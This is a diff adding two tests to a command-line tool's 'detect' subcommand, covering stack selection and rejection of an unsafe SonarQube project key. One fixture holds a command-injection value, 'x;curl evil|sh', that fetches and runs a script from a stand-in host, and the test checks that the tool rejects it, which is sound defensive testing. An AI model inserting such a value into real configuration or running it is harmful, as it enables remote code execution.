@@ -96,6 +96,32 @@ describe('sonar-setup detect', () => {
     assert.deepEqual(JSON.parse(res.stdout).ask, ['maven', 'gradle']);
   });
 
+  test('resolves the ask with --stack gradle', () => {
+    // Arrange
+    const dir = gitRepo({ 'pom.xml': '<project/>', 'build.gradle': SONAR_GRADLE });
+    // Act
+    const res = run(['detect', '--root', dir, '--stack', 'gradle']);
+    // Assert
+    const out = JSON.parse(res.stdout);
+    assert.equal(out.stack, 'gradle');
+    assert.equal(out.scanCommand, 'scan-gradle');
+    assert.equal(out.ask, undefined);
+  });
+
+  test('stops on an unsafe sonar.projectKey', () => {
+    // Arrange
+    const dir = gitRepo({
+      'package.json': '{}',
+      'sonar-project.properties': 'sonar.projectKey=x;curl evil|sh\n'
+    });
+    // Act
+    const res = run(['detect', '--root', dir]);
+    // Assert
+    const out = JSON.parse(res.stdout);
+    assert.match(out.stop, /^invalid sonar\.projectKey/);
+    assert.equal(out.key, null);
+  });
+
   test('exits 1 with one stderr line outside a git repository', () => {
     // Arrange
     const dir = tempDir();
